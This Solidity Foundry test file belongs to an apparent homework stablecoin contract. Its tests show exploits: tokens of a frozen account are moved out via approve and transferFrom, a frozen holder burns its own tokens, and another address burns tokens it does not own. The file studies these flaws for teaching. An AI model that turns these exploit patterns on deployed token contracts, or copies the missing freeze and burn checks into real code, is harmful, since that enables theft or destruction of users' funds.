// SPDX-License-Identifier: MIT

pragma solidity >= 0.8.25;

import { Test } from "forge-std/src/Test.sol";
import { console2 } from "forge-std/src/console2.sol";
import { StableCoin } from "../../src/homework2/Stablecoin.sol";

contract StableCoinTest is Test {
    StableCoin internal stablecoin;

    function setUp() public virtual {
        stablecoin = new StableCoin();
        stablecoin.mint(address(1), 1000e18);
        stablecoin.freeze(address(1));
    }

    function testFail_UnableToTransferWhenFrozen() external {
        stablecoin.transfer(address(2), 1000e18);
    }

    function test_exploitFreezeByTransferFrom() external {
        vm.startPrank(address(1));
        stablecoin.approve(address(2), 1000e18);
        vm.stopPrank();
        vm.startPrank(address(2));
        stablecoin.transferFrom(address(1), address(2), 1000e18);
        vm.stopPrank();
        uint256 balanceAfter = stablecoin.balanceOf(address(1));
        assertEq(balanceAfter, 0, "balance mismatch");
    }

    function test_exploitFreezeButBurningIt() external {
        vm.startPrank(address(1));
        stablecoin.burn(address(1), 1000e18);
        vm.stopPrank();
        uint256 balanceAfter = stablecoin.balanceOf(address(1));
        assertEq(balanceAfter, 0, "balance mismatch");
    }

    function test_burningSomeoneElseToken() external {
        vm.startPrank(address(2));
        stablecoin.burn(address(1), 1000e18);
        vm.stopPrank();
        uint256 balanceAfter = stablecoin.balanceOf(address(1));
        assertEq(balanceAfter, 0, "balance mismatch");
    }
}
